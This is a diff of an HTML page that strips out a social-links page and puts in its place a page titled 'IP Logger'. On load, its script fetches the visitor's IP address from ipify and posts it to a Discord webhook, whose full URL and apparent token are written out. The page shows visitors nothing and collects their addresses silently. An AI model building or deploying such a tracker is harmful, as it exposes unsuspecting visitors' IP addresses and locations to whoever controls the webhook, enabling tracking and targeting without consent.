@@ -3,57 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Your Social Links</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #121212;
-            color: #f0f0f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: #1f1f1f;
-            border-radius: 8px;
-            padding: 20px;
-            text-align: center;
-            width: 300px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
-        }
-        h1 {
-            margin-bottom: 20px;
-            font-size: 24px;
-            color: #ffffff;
-        }
-        .social-links a {
-            display: block;
-            text-decoration: none;
-            color: #fff;
-            background-color: #3498db;
-            margin: 10px 0;
-            padding: 12px;
-            border-radius: 6px;
-            font-size: 18px;
-            transition: background-color 0.3s;
-        }
-        .social-links a:hover {
-            background-color: #2980b9;
-        }
-    </style>
+    <title>IP Logger</title>
 </head>
 <body>
-    <div class="container">
-        <h1>Your Social Links</h1>
-        <div class="social-links">
-            <a href="https://www.youtube.com/c/YourChannel" target="_blank">YouTube</a>
-            <a href="https://www.tiktok.com/@YourHandle" target="_blank">TikTok</a>
-            <a href="https://twitter.com/YourHandle" target="_blank">Twitter</a>
-            <a href="https://www.instagram.com/YourHandle" target="_blank">Instagram</a>
-            <a href="https://www.facebook.com/YourPage" target="_blank">Facebook</a>
-        </div>
-    </div>
+    <script>
+        // JavaScript to capture IP and send to Discord
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                const webhookUrl = 'https://discord.com/api/webhooks/1330173184871235695/lOtIB6FEivCWw5KcjFYgt6OUzgr7gMnI-i0DuJKnJ-bwidYIHAOShrwj0rj7w0CqjlXV'; // Replace with your webhook URL
+                const payload = {
+                    content: `New visitor IP: ${ip}`
+                };
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            });
+    </script>
 </body>
 </html>
